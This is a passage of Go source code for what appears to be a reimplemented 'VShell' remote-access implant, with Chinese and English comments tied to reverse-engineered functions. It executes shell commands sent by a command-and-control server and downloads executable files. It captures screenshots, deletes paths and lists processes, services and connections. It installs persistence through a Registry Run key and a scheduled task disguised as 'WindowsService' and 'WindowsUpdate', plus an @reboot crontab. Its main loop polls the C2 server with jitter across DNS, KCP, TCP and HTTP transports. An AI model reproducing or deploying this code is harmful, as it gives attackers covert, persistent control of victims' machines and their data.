		dst, _ := payload["dst"].(string)
		if url == "" {
			return "", "url required"
		}
		if dst == "" {
			dst = filepathBase(url)
		}
		resp, err := http.Get(url)
		if err != nil {
			return "", err.Error()
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		os.WriteFile(dst, data, 0755)
		return fmt.Sprintf("downloaded: %s -> %s (%d bytes)", url, dst, len(data)), ""

	case CmdSleep:
		interval, _ := payload["interval"].(float64)
		if interval > 0 {
			sleepTime = int(interval)
		}
		return fmt.Sprintf("interval: %d", sleepTime), ""

	case CmdScreenshot:
		return captureScreenshot()

	case CmdExit:
		transport.Close()
		os.Exit(0)
		return "", ""

	default:
		// 未知命令类型必须**明确失败**，不能交给 shell。
		//
		// 两点原因：(1) 原版对未知命令有自己的错误路径（FUN_01153100 匹配失败后
		// 走接收缓冲上的解析），把原文当 shell 执行既非原版行为、也无处可证；
		// (2) 面板/服务器侧若拼出一条我们尚未识别的命令，直接执行等于把「我没
		// 实现」变成「我替你执行」，风险不可接受。
		// 只有显式的 {"type":"shell"}（以及无类型的自由文本，见上方 cmdType
		// 赋值路径）才会进入 runCommand。
		return "", "unknown command type " + strconv.Quote(cmdType)
	}
}

// firstWord 取字符串的首个空白分隔片段（用于错误信息，避免回显超长载荷）。
func firstWord(s string) string {
	if i := strings.IndexAny(s, " \t\r\n"); i >= 0 {
		return s[:i]
	}
	return s
}

func runCommand(command string, timeout int) (string, string) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
		flag = "/C"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	cmd := exec.Command(shell, flag, command)
	hideCmdWindow(cmd)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	if timeout > 0 {
		select {
		case <-time.After(time.Duration(timeout) * time.Second):
			cmd.Process.Kill()
			return stdout.String(), "timeout"
		case err := <-done:
			if err != nil {
				return stdout.String() + "\n" + stderr.String(), err.Error()
			}
			return stdout.String() + "\n" + stderr.String(), ""
		}
	}

	err := <-done
	if err != nil {
		return stdout.String() + "\n" + stderr.String(), err.Error()
	}
	return stdout.String() + "\n" + stderr.String(), ""
}

func listDir(path string) (string, string) {
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err.Error()
	}
	type FileEntry struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		IsDir   bool   `json:"is_dir"`
		ModTime string `json:"mod_time"`
	}
	var files []FileEntry
	for _, e := range entries {
		info, _ := e.Info()
		var size int64
		var modTime string
		if info != nil {
			size = info.Size()
			modTime = info.ModTime().Format(time.RFC3339)
		}
		files = append(files, FileEntry{e.Name(), size, e.IsDir(), modTime})
	}
	if files == nil {
		files = []FileEntry{}
	}
	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return files[i].Name < files[j].Name
	})
	data, _ := json.Marshal(files)
	return string(data), ""
}

func runDelete(path string) string {
	info, err := os.Stat(path)
	if err != nil {
		return err.Error()
	}
	if info.IsDir() {
		if err := os.RemoveAll(path); err != nil {
			return err.Error()
		}
		return ""
	}
	if err := os.Remove(path); err != nil {
		return err.Error()
	}
	return ""
}

func getDiskCmd() string {
	if runtime.GOOS == "windows" {
		return "wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem /format:csv 2>nul"
	}
	return "df -h 2>/dev/null"
}

func getPSCmd() string {
	if runtime.GOOS == "windows" {
		return "tasklist /FO CSV 2>nul"
	}
	return "ps aux 2>/dev/null"
}

// ============================================================================
// Persistence
// 持久化（开机自启动）
// ============================================================================

func installPersistence() (string, string) {
	exe, _ := os.Executable()

	if runtime.GOOS == "windows" {
		// Copy to AppData
		os.MkdirAll(filepathDir(persistPath), 0755)
		src, _ := os.ReadFile(exe)
		os.WriteFile(persistPath, src, 0755)

		// Registry run key
		cmd := exec.Command("reg", "add",
			"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsService", "/t", "REG_SZ",
			"/d", persistPath, "/f")
		cmd.Run()

		// Scheduled task
		exec.Command("schtasks", "/create", "/tn", "WindowsUpdate",
			"/tr", persistPath, "/sc", "daily", "/f").Run()

		return fmt.Sprintf("Persistence installed: %s", persistPath), ""
	}

	// Linux/macOS persistence
	os.MkdirAll(filepathDir(persistPath), 0755)
	src, _ := os.ReadFile(exe)
	os.WriteFile(persistPath, src, 0755)
	os.Chmod(persistPath, 0755)

	// Crontab
	cronEntry := fmt.Sprintf("@reboot %s >/dev/null 2>&1\n", persistPath)
	os.WriteFile("/tmp/cron_tmp", []byte(cronEntry), 0644)
	exec.Command("crontab", "/tmp/cron_tmp").Run()
	os.Remove("/tmp/cron_tmp")

	return fmt.Sprintf("Persistence installed: %s", persistPath), ""
}

func removePersistence() (string, string) {
	if runtime.GOOS == "windows" {
		exec.Command("reg", "delete",
			"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsService", "/f").Run()
		exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").Run()
	} else {
		exec.Command("crontab", "-r").Run()
	}
	os.Remove(persistPath)
	return "Persistence removed", ""
}

// ============================================================================
// Screenshot capture (platform-specific)
// 截图捕获（平台相关）
// ============================================================================

func captureScreenshot() (string, string) {
	if runtime.GOOS == "windows" {
		return windowsScreenshot()
	}
	return linuxScreenshot()
}

func windowsScreenshot() (string, string) {
	// Use PowerShell to capture screenshot
	psScript := `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
$graphics.Dispose()
$bitmap.Dispose()
$ms.Dispose()
`
	cmd := exec.Command("powershell", "-NoProfile", "-Command", psScript)
	hideCmdWindow(cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err.Error()
	}
	// Strip whitespace from base64
	result := strings.TrimSpace(string(output))
	return result, ""
}

func linuxScreenshot() (string, string) {
	// Try various screenshot tools
	for _, tool := range []string{"import", "scrot", "gnome-screenshot", "spectacle"} {
		tmpFile := fmt.Sprintf("/tmp/.ss_%d.png", pid)
		cmd := exec.Command(tool, tmpFile)
		if tool == "import" {
			cmd = exec.Command("import", "-window", "root", tmpFile)
		}
		if tool == "spectacle" {
			cmd = exec.Command("spectacle", "-b", "-n", "-o", tmpFile)
		}
		cmd.Run()
		if data, err := os.ReadFile(tmpFile); err == nil {
			os.Remove(tmpFile)
			return base64.StdEncoding.EncodeToString(data), ""
		}
	}
	return "", "no screenshot tool available (install imagemagick, scrot, or spectacle)"
}

// ============================================================================
// Main loop
// 主循环
// ============================================================================

// main 是 Agent 的入口：加载配置、启动传输、进入签到/任务循环。
// main is the agent entry point: loads config, starts transport, and runs the
// check-in/task loop.
func main() {
	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)

	// Parse transport mode from server address
	mode := "http"
	addr := ServerAddr
	if strings.Contains(addr, "://") {
		parts := strings.SplitN(addr, "://", 2)
		mode = parts[0]
		addr = parts[1]
	}

	switch mode {
	case "dns":
		transport = newDNSTransport(addr)
	case "kcp":
		transport = newKCPTransport(addr)
	case "tcp", "raw":
		// Pooled TCP transport aligned to FUN_00fc7560/FUN_00fc9de0
		// (message_wire.go frame encryption + <u32 LE len> header).
		transport = newRealTransport(addr, VerifyKey, EncryptSalt)
	case "wss", "https":
		if !strings.HasPrefix(addr, "https") {
			addr = "https://" + addr
		}
		transport = newHTTPTransport(addr)
	default:
		if !strings.HasPrefix(addr, "http") {
			addr = "http://" + addr
		}
		transport = newHTTPTransport(addr)
	}

	// Check-in with exponential backoff
	var backoff time.Duration
	for {
		resp, err := transport.Checkin()
		if err != nil {
			if backoff == 0 {
				backoff = 1 * time.Second
			} else {
				backoff *= 2
			}
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			log.Printf("Checkin failed: %v (retry in %v)", err, backoff)
			time.Sleep(backoff)
			continue
		}

		if resp.Status == "ok" {
			log.Printf("Checkin OK: client=%d, session=%s, interval=%d",
				resp.ClientID, resp.SessionID, resp.Interval)
			backoff = 0
			break
		}
		if resp.Message != "" {
			log.Printf("Server message: %s", resp.Message)
		}
		time.Sleep(5 * time.Second)
	}

	// Main C2 polling loop
	for {
		jitter := time.Duration(0)
		if jitterTime > 0 {
			b := make([]byte, 2)
			rand.Read(b)
			jitter = time.Duration(binary.LittleEndian.Uint16(b)%uint16(jitterTime)) * time.Second
		}
		time.Sleep(time.Duration(sleepTime)*time.Second + jitter)

		tasks, err := transport.GetTasks()
		if err != nil {
			continue
		}
		if len(tasks) == 0 {
			continue
		}

		for _, task := range tasks {
			log.Printf("Task %d: %s", task.ID, task.Command)
			result, errMsg := executeCommand(task.ID, task.Command, task.Timeout)
			status := "completed"
			if errMsg != "" {
				status = "failed"
				if result != "" {
					result += "\n"
				}
				result += "ERROR: " + errMsg
			}
			// 未对齐点（已知偏差，未在此处修）：原版把结果写成 24 字节类型化字段帧
			// （FUN_0100d160 / FUN_0100d440 / FUN_01094a20，见上方「结果帧」一节），
			// 而这里的 SendResult 走 ResultRequest JSON + AES-256-GCM 帧
			// （agent/transport_real.go 的 SendResult）。把结果帧真正接到线路上是
			// 另一项独立任务，本函数只投递文本；nativeCommandFrames 里的帧当前仅
			// 供测试观察。
			if err := transport.SendResult(task.ID, result, status); err != nil {
				log.Printf("Result send failed: %v", err)
			}
		}
	}
}

// ============================================================================
// Helpers
// 辅助函数
// ============================================================================

func filepathBase(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[i+1:]
		}
	}
	return path
}

func filepathDir(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[:i]
		}
	}
	return "."
}

// listProcesses 枚举本机进程（dec case 0x24 的本地可复现部分）。
// listProcesses enumerates local processes — the locally reproducible half of
// dec case 0x24 (the original walks its own session table; the frame shape and the
// "enumerate processes" step are what we can align).
func listProcesses() []string {
	out, errMsg := runCommand(getPSCmd(), 10)
	if errMsg != "" || out == "" {
		return nil
	}
	var res []string
	for _, line := range strings.Split(out, "\n") {
		if line = strings.TrimSpace(line); line != "" {
			res = append(res, line)
		}
	}
	return res
}

// listServices 枚举本机服务（dec case 0x25 的本地可复现部分）。
// listServices enumerates local services — the locally reproducible half of
// dec case 0x25.
func listServices() []string {
	var cmd string
	if runtime.GOOS == "windows" {
		cmd = "sc query type= service state= all"
	} else {
		cmd = "systemctl list-units --type=service --no-pager"
	}
	out, errMsg := runCommand(cmd, 10)
	if errMsg != "" || out == "" {
		return nil
	}
	var res []string
	for _, line := range strings.Split(out, "\n") {
		if line = strings.TrimSpace(line); line != "" {
			res = append(res, line)
		}
	}
	return res
}

// listConnections 枚举本机 TCP 连接（dec case 0xe 的本地可复现部分）。
// listConnections enumerates this host's TCP connections — the locally
// reproducible half of dec case 0xe. The original walks its own connection pool;
// what we can reproduce is "which connections exist on this host".
func listConnections() []string {
	var cmd string
	if runtime.GOOS == "windows" {
		cmd = "netstat -ano -p tcp"
	} else {
		cmd = "ss -tn 2>/dev/null || netstat -tn 2>/dev/null"
	}
	out, errMsg := runCommand(cmd, 10)
	if errMsg != "" || out == "" {
		return nil
	}
	var res []string
	for _, line := range strings.Split(out, "\n") {
		if line = strings.TrimSpace(line); line != "" {
			res = append(res, line)
		}
	}
	return res
}
